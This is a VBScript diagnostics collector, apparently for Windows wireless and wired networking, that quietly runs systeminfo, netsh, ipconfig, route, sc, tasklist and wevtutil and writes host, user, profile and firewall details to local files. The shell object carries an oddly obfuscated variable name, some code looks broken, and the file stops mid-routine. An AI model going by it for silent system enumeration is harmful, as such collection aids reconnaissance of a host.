
Dim FSO, shell, xslProcessor

Sub RunCmd(CommandString, OutputFile)
    cmd = "cmd /c " + CommandString + " >> " + OutputFile
    shell.Run cmd, 0, True
End Sub

Sub GetOSInfo(outputFileName)
    On Error Resume Next
    strComputer = "."
    HKEY_LOCAL_MACHINE = &H80000002

    Dim objReg, outputFile
    Dim buildDetailNames, buildDetailRegValNames

    buildDetailNames = Array("Product Name", "Version", "Build Lab", "Type")
    buildDetailRegValNames = Array("ProductName", "CurrentVersion", "BuildLabEx", "CurrentType")

    Set outputFile = FSO.OpenTextFile(outputFileName, 2, True)

    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
                     strComputer & "\root\default:StdRegProv")

    outputFile.WriteLine("[Architecture/Processor Information]")
    outputFile.WriteLine()
    outputFile.Close
    cmd = "cmd /c set processor >> " & outputFileName
    shell.Run cmd, 0, True

    Set outputFile = FSO.OpenTextFile(outputFileName, 8, True)

    outputFile.WriteLine()
    outputFile.WriteLine("[Operating System Information]")
    outputFile.WriteLine()

    strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    for I = 0 to UBound(buildDetailNames)
        objReg.GetStringValue HKEY_LOCAL_MACHINE, strKeyPath, buildDetailRegValNames(I), info
        outputFile.WriteLine(buildDetailNames(I) + " = " + info)
    Next

    outputFile.WriteLine()
    strKeyPath = "SYSTEM\SETUP"
    objReg.GetDWordValue HKEY_LOCAL_MACHINE, strKeyPath, "Upgrade", upgradeInfo
    if IsNull(upgradeInfo) Then
        outputFile.WriteLine("This is a clean installed system")
    Else
        outputFile.WriteLine("This is an upgraded system")
    End If

    outputFile.WriteLine(buildDetailNames(I) + " = " + info)

    outputFile.WriteLine()
    outputFile.WriteLine("[File versions]")
    outputFile.WriteLine()

    Set shell = WScript.CreateObject( "WScript.Shell" )
    windir = shell.ExpandEnvironmentStrings("%windir%\system32\")

    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Dim FileSet
    FileSet = Array("onex.dll", "l2nacp.dll", "wlanapi.dll", "wlancfg.dll", "wlanconn.dll", "wlandlg.dll", "wlanext.exe", "wlangpui.dll", "wlanhc.dll", "wlanmm.dll", "wlanmmhc.dll", "wlanmsm.dll", "wlanpref.dll", "wlansec.dll", "wlansvc.dll", "wlanui.dll")

    For Each file in FileSet
        filename = windir + file
        strQuery = "Select * from CIM_Datafile Where Name = '" + Replace(filename, "\", "\\") + "'"
        Set fileProp = objWMIService.ExecQuery _
            (strQuery)

        For Each objFile in fileProp
            outputFile.WriteLine(file + "    " + objFile.Version)
        Next
    Next

    Dim Dot3FileSet
    Dot3FileSet = Array("onex.dll", "dot3api.dll", "dot3cfg.dll", "dot3dlg.dll", "dot3gpclnt.dll", "dot3gpui.dll", "dot3msm.dll", "dot3svc.dll", "dot3ui.dll")

    For Each file in Dot3FileSet
        filename = windir + file
        strQuery = "Select * from CIM_Datafile Where Name = '" + Replace(filename, "\", "\\") + "'"
        Set fileProp = objWMIService.ExecQuery _
            (strQuery)

        For Each objFile in fileProp
            outputFile.WriteLine(file + "    " + objFile.Version)
        Next
    Next

    call GetBatteryInfo(outputFile)
    outputFile.Close

    Set outputFile = FSO.OpenTextFile(outputFileName, 8, True)
    outputFile.WriteLine("")
    outputFile.WriteLine("[System Information]")
    outputFile.WriteLine("")
    outputFile.Close

    'Comments: Dumping System Information using "systeminfo" command

    cmd = "cmd /c systeminfo >> " & outputFileName
    shell.Run cmd, 0, True

    Set outputFile = FSO.OpenTextFile(outputFileName, 8, True)
    outputFile.WriteLine("")
    outputFile.WriteLine("[User Information]")
    outputFile.WriteLine("")
    outputFile.Close

    cmd = "cmd /c set u >> " & outputFileName
    shell.Run cmd, 0, True

End Sub

Sub GetBatteryInfo(outputFile)
    On Error Resume Next
    strComputer = "."
    outputFile.WriteLine()
    outputFile.WriteLine("[Power Information]")
    outputFile.WriteLine()
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Battery")
    if colItems.Count = 0 Then
    outputFile.WriteLine("It is a Desktop running on AC")
    Else
    For Each objItem in colItems
        if objItem.Availability = 2 Then
        outputFile.WriteLine("Machine is running on AC Adapter")
        Else
        if objitem.Availability = 3 Then
        outputFile.WriteLine("Machine is running on Battery")
        End If
        End If
    Next
    End If
End Sub

Sub GetMiracastInfo(outputFileName)
    On Error Resume Next
    Dim MiracastInfoFile

    Set MiracastInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    MiracastInfoFile.WriteLine("-------------------------------------")
    MiracastInfoFile.WriteLine("-------+ Wireless Display Information +------")
    MiracastInfoFile.WriteLine("-------------------------------------")
    MiracastInfoFile.Close

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )
    
    ' Write the file with the directx diagnostics
    cmd = "cmd /c dxdiag /t dxdiag.txt"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    ' Write the file with the dispdiag information
    cmd = "cmd /c dispdiag -out dispdiag_stop.dat"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    ' Write the wlan information to the output file (wlaninfo.txt)
    
    cmd = "cmd /c time /t  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh wl show i  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh wl show d  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh wlan show interfaces  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh wlan sho net m=b  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub


Sub GetWcnInfo(outputFileName)
    On Error Resume Next
    Dim WcnInfoFile

    Set WcnInfoFile= FSO.OpenTextFile(outputFileName, 8, True)
    WcnInfoFile.WriteLine("-------------------------------------")
    WcnInfoFile.WriteLine("---------+ WCN Information +---------")     
    WcnInfoFile.WriteLine("-------------------------------------")    
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("-----------------")
    WcnInfoFile.WriteLine("+ Services Status")
    WcnInfoFile.WriteLine("-----------------")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.Close

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c sc query wcncsvc  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc query wlansvc  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc query eaphost  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc query fdrespub  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc query upnphost   >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc query eaphost  >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True


    Set WcnInfoFile= FSO.OpenTextFile(outputFileName, 8, True)
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("-----------------------")
    WcnInfoFile.WriteLine("+ WCN Files Information ")
    WcnInfoFile.WriteLine("-----------------------")
    WcnInfoFile.WriteLine("")

    strComputer = "."

    Set shell = WScript.CreateObject( "WScript.Shell" )
    windir = shell.ExpandEnvironmentStrings("%windir%\system32\")

    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Dim FileSet
    FileSet = Array("wcncsvc.dll", "wcnapi.dll", "fdwcn.dll", "wcneapauthproxy.dll", "wcneappeerproxy.dll", "wcnwiz.dll", "wcnnetsh.dll", "wczdlg.dll")

    For Each file in FileSet
        filename = windir + file
        strQuery = "Select * from CIM_Datafile Where Name = '" + Replace(filename, "\", "\\") + "'"
        Set fileProp = objWMIService.ExecQuery _
            (strQuery)

        For Each objFile in fileProp
        WcnInfoFile.WriteLine("")
        WcnInfoFile.WriteLine("---------------------")
        WcnInfoFile.WriteLine(file)
        WcnInfoFile.WriteLine("---------------------")
		WcnInfoFile.WriteLine("	- Version 		:  	" + objFile.Version )
		WcnInfoFile.WriteLine("	- Creation Date		: 	" + objFile.CreationDate  )
		WcnInfoFile.WriteLine("	- Description		: 	" + objFile.Description  )
		WcnInfoFile.WriteLine("	- Installation Date	: 	" +  objFile.InstallDate )
		WcnInfoFile.WriteLine("	- In Use Count		:	" + objFile.InUseCount   )
		WcnInfoFile.WriteLine("	- Last Accessed		: 	" + objFile.LastAccessed  )
		WcnInfoFile.WriteLine("	- Last Modified 	: 	" + objFile.LastModified  )
		WcnInfoFile.WriteLine("	- Status		: 	" + objFile.Status  )
        Next
    Next




    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("-------------------------------")
    WcnInfoFile.WriteLine("+ Network Adapters Information ")
    WcnInfoFile.WriteLine("-------------------------------")
    WcnInfoFile.WriteLine("")

    strQuery = "Select * from Win32_NetworkAdapter " 
    
    Set AdapterProp = objWMIService.ExecQuery _
            (strQuery)


    For Each objFile in AdapterProp
        WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("---------------------")
    WcnInfoFile.WriteLine("DeviceID  :  " + objFile.DeviceID   )
    WcnInfoFile.WriteLine("---------------------")
	WcnInfoFile.WriteLine("	- Adapter Type		:  	" + objFile.AdapterType  )
	WcnInfoFile.WriteLine("	- Auto Sense			: 	" + objFile.AutoSense )
	WcnInfoFile.WriteLine("	- Description 		: 	" + objFile.Description   )
	WcnInfoFile.WriteLine("	- NetConnectionID  	: 	" + objFile.NetConnectionID   )
	WcnInfoFile.WriteLine("	- GUID 			: 	" + objFile.GUID )
	WcnInfoFile.WriteLine("	- MACAddress  		: 	" + objFile.MACAddress  )
	WcnInfoFile.WriteLine("	- Manufacturer   	: 	" + objFile.Manufacturer   )
	WcnInfoFile.WriteLine("	- MaxSpeed    	: 	" + objFile.MaxSpeed    )
	WcnInfoFile.WriteLine("	- Speed        		: 	" +  objFile.Speed    )
	WcnInfoFile.WriteLine("	- Name     		: 	" + objFile.Name     )
    
    Select Case objFile.NetConnectionStatus 
        Case 0    strAvail= "Disconnected"              
        Case 1    strAvail= "Connecting"
		Case 2 	strAvail= "Connected"
		Case 3 	strAvail= "Disconnecting"
		Case 4 	strAvail= "Hardware not present"
	   	Case 5 	strAvail= "Hardware disabled"
	     	Case 6 	strAvail= "Hardware malfunction"		     	
		Case 7 	strAvail= "Media disconnected"
	     	Case 8 	strAvail= "Authenticating"
	     	Case 9 	strAvail= "Authentication succeeded"
	     	Case 10 	strAvail= "Authentication failed"
	     	Case 11 	strAvail= "Invalid address"		     	
	     	Case 12	strAvail= "Credentials required"
    End Select


	WcnInfoFile.WriteLine("	- NetConnectionStatus	: 	" + strAvail )
	WcnInfoFile.WriteLine("	- NetEnabled  	: 	" +  objFile.NetEnabled  )
	WcnInfoFile.WriteLine("	- NetworkAddresses   	: 	" +  objFile.NetworkAddresses  )
	WcnInfoFile.WriteLine("	- PermanentAddress    	: 	" +  objFile.PermanentAddress   )
	WcnInfoFile.WriteLine("	- PhysicalAdapter    	: 	" +  objFile.PhysicalAdapter   )
	WcnInfoFile.WriteLine("	- PNPDeviceID     	: 	" +  objFile.PNPDeviceID    )
	WcnInfoFile.WriteLine("	- ProductName      	: 	" +  objFile.ProductName     )
	WcnInfoFile.WriteLine("	- ServiceName       	: 	" +  objFile.ServiceName      )

	WcnInfoFile.WriteLine("	- SystemName       	: 	" + objFile.SystemName       )
	WcnInfoFile.WriteLine("	- TimeOfLastReset	: 	" + objFile.TimeOfLastReset )
	WcnInfoFile.WriteLine("	- Status      	: 	" + objFile.Status      )

    Select Case objFile.StatusInfo  
        Case 1    strAvail= "Other"
		Case 2 	strAvail= "Unknown"
		Case 3 	strAvail= "Enabled"
		Case 4 	strAvail= "Disabled"
		Case 5 	strAvail= "Not Applicable"
        End Select
        
	WcnInfoFile.WriteLine("	- StatusInfo		: 	" + strAvail )
        
       Select Case objFile.Availability 
        Case 1    strAvail= "Other"
		Case 2 	strAvail= "Unknown"
	     	Case 3 	strAvail= "Running or Full Power"
	     	Case 4 	strAvail= "Warning"
		Case 5 	strAvail= "In test"
	     	Case 6 	strAvail= "Not Applicable"
	     	Case 7 	strAvail= "Power Off"
	     	Case 8 	strAvail= "Off Line"
	     	Case 9 	strAvail= "Off Duty"
	     	Case 10 	strAvail= "Degraded"
	     	Case 11 	strAvail= "Not Installed"
	     	Case 12	strAvail= "Install Error"
	     	Case 13 	strAvail= "Power Save - Unknown"
	     	Case 14 	strAvail= "Power Save - Low Power Mode"
	     	Case 15 	strAvail= "Power Save - Standby"
	     	Case 16 	strAvail= "Power Cycle"
	     	Case 17 	strAvail= "Power Save - Warning"
    End Select

	WcnInfoFile.WriteLine("	- Availability		: 	" + strAvail )	
	WcnInfoFile.WriteLine("	- Caption 		: 	" +  objFile.Caption )

		Select Case objFile.ConfigManagerErrorCode
			Case 0	strAvail= "Device is working properly"
			Case 1	strAvail= "Device is not configured correctly"
			Case 2	strAvail= "Windows cannot load the driver for this device"
			Case 3	strAvail= "Driver for this device might be corrupted, or the system may be low on memory or other resources"    	
			Case 4	strAvail= "Device is not working properly. One of its drivers or the registry might be corrupted."
			Case 5	strAvail= "Driver for the device requires a resource that Windows cannot manage."
			Case 6	strAvail= "Boot configuration for the device conflicts with other devices"
			Case 7	strAvail= "Cannot filter"
			Case 8	strAvail= "Driver loader for the device is missing"
			Case 9	strAvail= "Device is not working properly. The controlling firmware is incorrectly reporting the resources for the device"
			Case 10	strAvail= "Device cannot start"
			Case 11	strAvail= "Device failed"
			Case 12	strAvail= "Device cannot find enough free resources to use"
			Case 13	strAvail= "Windows cannot verify the device's resources"
			Case 14	strAvail= "Device cannot work properly until the computer is restarted"
			Case 15	strAvail= "Device is not working properly due to a possible re-enumeration problem"
			Case 16	strAvail= "Windows cannot identify all of the resources that the device uses"
			Case 17	strAvail= "Device is requesting an unknown resource type."
			Case 18	strAvail= "Device drivers must be reinstalled"
			Case 19	strAvail= "Failure using the VxD loader"
			Case 20	strAvail= "Registry might be corrupted."
			Case 21	strAvail= "System failure. If changing the device driver is ineffective, see the hardware documentation. Windows is removing the device"
			Case 22	strAvail= "Device is disabled"
			Case 23	strAvail= "System failure. If changing the device driver is ineffective, see the hardware documentation"
			Case 24	strAvail= "Device is not present, not working properly, or does not have all of its drivers installed."
			Case 25	strAvail= "Windows is still setting up the device"
			Case 27	strAvail= "Device does not have valid log configuration."
			Case 28	strAvail= "Device drivers are not installed."
			Case 29	strAvail= "Device is disabled. The device firmware did not provide the required resources."
			Case 30	strAvail= "Device is using an IRQ resource that another device is using."
			Case 31	strAvail= "Device is not working properly. Windows cannot load the required device drivers." 			
	End Select

	WcnInfoFile.WriteLine("	- ConfigManagerErrorCode:	" + strAvail )
	WcnInfoFile.WriteLine("	- Error Cleared 	: 	" + objFile.ErrorCleared )
	WcnInfoFile.WriteLine("	- Error Description  	: 	" + objFile.ErrorDescription)
	WcnInfoFile.WriteLine("	- LastErrorCode		: 	" + objFile.LastErrorCode)
	WcnInfoFile.WriteLine("	- Index 	 	: 	" + objFile.Index)
	WcnInfoFile.WriteLine("	- Installed  	: 	" + objFile.Installed  )
	WcnInfoFile.WriteLine("	- Install Date   	: 	" + objFile.InstallDate   )				
	WcnInfoFile.WriteLine("	- InterfaceIndex 	: 	" + objFile.InterfaceIndex )	
    Next
    WcnInfoFile.Close





    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("-----------------------")
    WcnInfoFile.WriteLine("+ ipconfig information")
    WcnInfoFile.WriteLine("-----------------------")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.Close


    cmd = "cmd /c ipconfig /all >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True



    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    WcnInfoFile.WriteLine("")    
    WcnInfoFile.WriteLine("----------------------")
    WcnInfoFile.WriteLine("+ Softap Capabilities ")
    WcnInfoFile.WriteLine("----------------------")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.Close

    cmd = "cmd /c netsh wlan show device >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    WcnInfoFile.WriteLine("")    
    WcnInfoFile.WriteLine("----------------------")
    WcnInfoFile.WriteLine("+ Dump wcncsvc RegKey ")
    WcnInfoFile.WriteLine("----------------------")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.Close

    cmd = "cmd /c reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcncsvc\Parameters >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True



'    Set shell = WScript.CreateObject( "WScript.Shell" )
'    windir = shell.ExpandEnvironmentStrings("%windir%\system32\")
'    filename = windir + "wcnwiz.dll"
'    commandname = windir + "rundll32.exe"

'    cmd = "cmd /c "& commandname &" "& filename &" , RunDumpWcnCache >> " & outputFileName
'    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True


    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    WcnInfoFile.WriteLine("")    
    WcnInfoFile.WriteLine("--------------------------------")
    WcnInfoFile.WriteLine("+ Network Discovery Information.")
    WcnInfoFile.WriteLine("--------------------------------")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("------------------------------")    
    WcnInfoFile.WriteLine("- Current Profile information")
    WcnInfoFile.WriteLine("------------------------------")    
    WcnInfoFile.WriteLine("")

    ' Profile Type
    Const NET_FW_PROFILE2_DOMAIN = 1
    Const NET_FW_PROFILE2_PRIVATE = 2
    Const NET_FW_PROFILE2_PUBLIC = 4

    ' Direction  
    Const NET_FW_RULE_DIR_IN = 1
    Const NET_FW_RULE_DIR_OUT = 2


    ' Create the FwPolicy2 object.
    Dim fwPolicy2    
    Dim ProfileType
    ProfileType = Array("Domain", "Private", "Public")

    Set fwPolicy2 = CreateObject("HNetCfg.FwPolicy2")

    CurrentProfile = fwPolicy2.CurrentProfileTypes
  
    WcnInfoFile.WriteLine ("Current firewall profile is: ")

    '// The returned 'CurrentProfiles' bitmask can have more than 1 bit set if multiple profiles 
    '//   are active or current at the same time

    if ( CurrentProfile AND NET_FW_PROFILE2_DOMAIN ) then
        WcnInfoFile.WriteLine(ProfileType(0))
    end if

    if ( CurrentProfile AND NET_FW_PROFILE2_PRIVATE ) then
    WcnInfoFile.WriteLine(ProfileType(1))
    end if

    if ( CurrentProfile AND NET_FW_PROFILE2_PUBLIC ) then
    WcnInfoFile.WriteLine(ProfileType(2))
    end if
    WcnInfoFile.Close


    cmd = "cmd /c netsh advfirewall show currentprofile >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True


    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    WcnInfoFile.WriteLine("")
    WcnInfoFile.WriteLine("----------------------------------------------")    
    WcnInfoFile.WriteLine("- Network discovery status for current profile")
    WcnInfoFile.WriteLine("----------------------------------------------")    
    WcnInfoFile.WriteLine("")               

    Dim rule
    ' Get the Rules object
    Dim RulesObject
    Set RulesObject = fwPolicy2.Rules

    
    For Each rule In Rulesobject
        if rule.Grouping = "@FirewallAPI.dll,-32752" then
            WcnInfoFile.WriteLine("")
            WcnInfoFile.WriteLine("  Rule Name:          " & rule.Name)
            WcnInfoFile.WriteLine("   ----------------------------------------------")
            WcnInfoFile.WriteLine("  Enabled:            " & rule.Enabled)
            WcnInfoFile.WriteLine("  Description:        " & rule.Description)
            WcnInfoFile.WriteLine("  Application Name:   " & rule.ApplicationName)
            WcnInfoFile.WriteLine("  Service Name:       " & rule.ServiceName)

        Select Case rule.Direction
                Case NET_FW_RULE_DIR_IN  WcnInfoFile.WriteLine("  Direction:          In")
             Case NET_FW_RULE_DIR_OUT WcnInfoFile.WriteLine("  Direction:          Out")
            End Select
    
    end if
    Next

    WcnInfoFile.Close

    
    
End Sub



Sub GetWirelessAdapterInfo(outputFile)
    On Error Resume Next
    Dim adapters, objReg
    Dim adapterDetailNames, adapterDetailRegValNames

    adapterDetailNames = Array("Driver Description", "Adapter Guid", "Hardware ID", "Driver Date", "Driver Version", "Driver Provider")
    adapterDetailRegValNames = Array("DriverDesc", "NetCfgInstanceId", "MatchingDeviceId", "DriverDate", "DriverVersion", "ProviderName")

    IHVDetailNames = Array("ExtensibilityDLL", "UIExtensibilityCLSID", "GroupName", "DiagnosticsID")
    IHVDetailRegValNames = Array("ExtensibilityDLL", "UIExtensibilityCLSID", "GroupName", "DiagnosticsID")

    HKEY_LOCAL_MACHINE = &H80000002
    strComputer = "."

    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
                     strComputer & "\root\default:StdRegProv")


    strKeyPath = "SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\"

    objReg.EnumKey HKEY_LOCAL_MACHINE, strKeyPath, adapterSet

    For Each adapter In adapterSet
        If StrComp("Properties", adapter) Then
            fullstrKeyPath = strKeyPath + adapter
            objReg.GetDWORDValue HKEY_LOCAL_MACHINE, fullstrKeyPath, "*IfType", ifType
            If ifType = 71 Then
                for I = 0 to UBound(adapterDetailNames)
                    objReg.GetStringValue HKEY_LOCAL_MACHINE, fullstrKeyPath, adapterDetailRegValNames(I), info
                    outputFile.WriteLine(adapterDetailNames(I) + " = " + info)
                Next

                ihvKeyPath = fullstrKeyPath + "\Ndi\IHVExtensions"
                For J = 0 to UBound(IHVDetailNames)
                    objReg.GetStringValue HKEY_LOCAL_MACHINE, ihvKeyPath, IHVDetailRegValNames(J), ihvInfo
                    outputFile.WriteLine(IHVDetailNames(J) + " = " + ihvInfo)
                Next
                    objReg.GetDWordValue HKEY_LOCAL_MACHINE, ihvKeyPath, "AdapterOUI", ihvInfo
                    outputFile.WriteLine("AdapterOUI = " + CSTR(ihvInfo))
                outputFile.WriteLine()
            End If
        End If
    Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )
    

    cmd = "cmd /c tasklist /svc > " & processes
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    Set objTextFile = FSO.OpenTextFile(processes, 1)
    strIHVOutput = objTextFile.ReadAll()

    Set regEx = New RegExp
    regEx.Pattern = "^wlanext.exe[\s|a-z|A-Z|\d]*"
    regEx.Multiline = True
    regEx.IgnoreCase = True
    regEx.Global = True

    Set Matches = regEx.Execute(strIHVOutput)

    For Each match in Matches
        outputFile.WriteLine(match.Value)
    Next

End Sub

Sub GetWirelessAutoconfigLog(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    'Export the operational log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-WLAN-AutoConfig/Operational"" " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it can be read on different machines
    cmd = "cmd /c wevtutil al " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   
End Sub

Sub GetWwanLog(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    'Export the operational log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-WWAN-SVC-EVENTS/Operational"" " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it can be read on different machines
    cmd = "cmd /c wevtutil al " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   
End Sub

Sub GetWcmLog(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    'Export the operational log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Wcmsvc/Operational"" " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it can be read on different machines
    cmd = "cmd /c wevtutil al " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   
End Sub

Sub GetWiredAdapterInfo(outputFile)
    On Error Resume Next
    Dim adapters, objReg
    Dim adapterDetailNames, adapterDetailRegValNames

    adapterDetailNames = Array("Driver Description", "Adapter Guid", "Hardware ID", "Driver Date", "Driver Version", "Driver Provider")
    adapterDetailRegValNames = Array("DriverDesc", "NetCfgInstanceId", "MatchingDeviceId", "DriverDate", "DriverVersion", "ProviderName")


    HKEY_LOCAL_MACHINE = &H80000002
    strComputer = "."

    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
                     strComputer & "\root\default:StdRegProv")


    strKeyPath = "SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\"

    objReg.EnumKey HKEY_LOCAL_MACHINE, strKeyPath, adapterSet

    For Each adapter In adapterSet
        If StrComp("Properties", adapter) Then
            fullstrKeyPath = strKeyPath + adapter
            objReg.GetDWORDValue HKEY_LOCAL_MACHINE, fullstrKeyPath, "*IfType", ifType
            If ifType = 6 Then
                for I = 0 to UBound(adapterDetailNames)
                    objReg.GetStringValue HKEY_LOCAL_MACHINE, fullstrKeyPath, adapterDetailRegValNames(I), info
                    outputFile.WriteLine(adapterDetailNames(I) + " = " + info)
                Next
                outputFile.WriteLine()
            End If
        End If
    Next
End Sub


Sub GetEnvironmentInfo(outputFileName)
    On Error Resume Next
    Dim envInfoFile

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netsh wlan show all > " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh lan show interfaces >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh lan show settings >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh lan show profiles >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh mbn show interfaces >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh mbn show profile name=* interface=* >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh mbn show readyinfo interface=* >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh mbn show capability interface=* >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c ipconfig /all >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    RunCmd "echo.", outputFileName
    RunCmd "echo ROUTE PRINT:", outputFileName
    RunCmd "route print", outputFileName
    
    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    envInfoFile.WriteLine("")
    envInfoFile.WriteLine("Machine certificates...")
    envInfoFile.WriteLine("")
    envInfoFile.Close

